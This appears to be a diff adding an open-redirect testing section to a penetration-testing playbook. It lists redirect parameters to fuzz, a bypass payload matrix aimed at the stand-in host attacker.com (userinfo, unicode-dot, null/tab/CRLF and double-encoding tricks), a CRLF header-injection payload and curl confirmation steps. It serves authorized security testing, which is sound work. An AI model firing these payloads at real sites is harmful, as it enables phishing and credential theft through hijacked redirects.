@@ -31,6 +31,45 @@ nist_csf:
 - During phishing simulation to chain open redirects with credential harvesting
 - When testing SSO implementations for redirect validation weaknesses
 
+## Critical: Payload Matrix and Bypasses (checklist-derived)
+
+### Parameters to test (fuzz every one)
+```
+url, redirect, redir, next, target, return, rurl, dest, destination,
+redirect_uri, redirect_url, checkout_url, continue, return_to, returnTo,
+return_path, go, image_url, view, login?to, out, r, u
+```
+
+### Bypass matrix (paste into the redirect parameter)
+```
+//attacker.com
+/\attacker.com
+https:attacker.com
+\/\/attacker.com
+//attacker.com/%2f..
+https://target.com@attacker.com
+https://target.com%2f@attacker.com
+//attacker%E3%80%82com          # unicode dot (。) -> attacker.com
+https://target.com.attacker.com  # whitelisted-host as subdomain prefix
+https://attacker.com/target.com  # whitelisted-host placed in path
+returnTo=///attacker.com/
+returnTo=http:///attacker.com/
+https://attacker.com%00.target.com   # %00 null byte
+https://attacker.com%09.target.com   # %09 tab
+https://attacker.com%0d%0a.target.com # %0d%0a CRLF
+```
+
+### Encoding / parsing tricks
+- **Whitelisted-host tricks:** `https://target.com.attacker.com` (your domain is a subdomain of attacker) and `https://attacker.com/target.com` (target string lives in the path) frequently pass naive "contains target.com" checks.
+- **Control-char injection:** insert `%00` (null), `%09` (tab), `%0d%0a` (CRLF) to truncate or confuse the validator: `//attacker.com%0d%0a`, `https://attacker.com%09@target.com`.
+- **Double-encoding:** `%252f%252f attacker.com` and `%252e` for dots when a single decode pass is performed before validation.
+- **CRLF:** if the value lands in a header, `%0d%0aLocation:%20https://attacker.com` can inject a second redirect.
+
+### How to confirm
+- **Server-side:** response status is 30x and the `Location:` header points to the attacker host. Check with `curl -sI -o /dev/null -w "%{redirect_url}\n" "<URL>"` or read the raw `Location` header.
+- **Client-side / DOM:** look for `window.location`, `location.href`, `location.assign/replace`, or a `<meta http-equiv="refresh">` populated from the parameter. Confirm the browser actually navigates off-origin.
+- A redirect only counts as a finding when the final destination is an external/attacker-controlled origin.
+
 ## Prerequisites
 - Burp Suite or OWASP ZAP for intercepting redirect requests
 - Collection of open redirect bypass payloads
